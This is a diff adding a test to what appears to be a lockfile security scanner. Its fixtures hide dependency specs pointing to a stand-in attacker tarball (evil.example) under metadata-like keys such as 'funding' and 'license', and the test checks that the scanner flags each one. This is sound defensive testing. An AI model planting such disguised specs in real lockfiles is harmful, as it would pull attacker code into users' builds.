@@ -1113,6 +1113,43 @@ def test_metadata_keys_are_exempt_only_in_npm_lockfiles():
     assert lock_hits("Pipfile.lock", text) != []
 
 
+_EVIL_TGZ = "https://evil.example/x.tgz"
+
+
+@pytest.mark.parametrize("path,text", [
+    # A name -> spec map with packages NAMED "version" and "funding": npm
+    # fetches an unmet edge from its spec, so the map is never metadata.
+    ("package-lock.json", json.dumps({"packages": {"": {"name": "app", "dependencies": {
+        "version": "^1.0.0", "funding": _EVIL_TGZ}}}})),
+    ("npm-shrinkwrap.json", json.dumps({"packages": {"node_modules/a": {
+        "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
+        "peerDependencies": {"version": "^1.0.0", "deprecated": _EVIL_TGZ}}}})),
+    ("package-lock.json", json.dumps({"lockfileVersion": 1, "dependencies": {"a": {
+        "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",
+        "requires": {"version": "^1.0.0", "license": _EVIL_TGZ}}}})),
+    ("bun.lock", _BUN_LOCK.replace('"ws": "^8.17.0",',
+                                   f'"ws": "^8.17.0", "version": "^1.0.0", "funding": "{_EVIL_TGZ}",')),
+    ("bun.lock", _BUN_LOCK.replace('{ "peerDependencies": { "bufferutil": "^4.0.1" }',
+                                   '{ "peerDependencies": { "bufferutil": "^4.0.1", "version": "1", '
+                                   f'"funding": "{_EVIL_TGZ}" }}')),
+    ("pnpm-lock.yaml", _PNPM_LOCK.replace("    peerDependencies:\n      bufferutil: ^4.0.1\n",
+                                          "    peerDependencies:\n      bufferutil: ^4.0.1\n"
+                                          f"      version: 1.0.0\n      funding: {_EVIL_TGZ}\n")),
+    ("pnpm-lock.yaml", _PNPM_LOCK.replace("    optionalDependencies:\n      bufferutil: 4.0.8\n",
+                                          "    optionalDependencies:\n      bufferutil: 4.0.8\n"
+                                          f"      version: 1.0.0\n      license: {_EVIL_TGZ}\n")),
+    ("yarn.lock", _YARN_BERRY.replace('    ws: "npm:^8.17.0"\n',
+                                      '    ws: "npm:^8.17.0"\n    version: "npm:^1.0.0"\n'
+                                      f'    funding: "{_EVIL_TGZ}"\n')),
+    ("yarn.lock", _YARN_V1.replace('    ws "^8.17.0"\n',
+                                   f'    ws "^8.17.0"\n    version "^1.0.0"\n    funding "{_EVIL_TGZ}"\n')),
+])
+def test_metadata_named_packages_in_a_dependency_map_are_checked(path, text):
+    assert _EVIL_TGZ in text
+    hits = lock_hits(path, text)
+    assert hits and {(h.rule, h.overridable) for h in hits} == {("lockfile-host", False)}
+
+
 def test_a_hosted_git_spec_already_in_the_base_is_not_a_hit():
     path, head = npm_family("package-lock.json", "github:atk/x#0123abc")
     assert lock_hits(path, head, base=head) == []
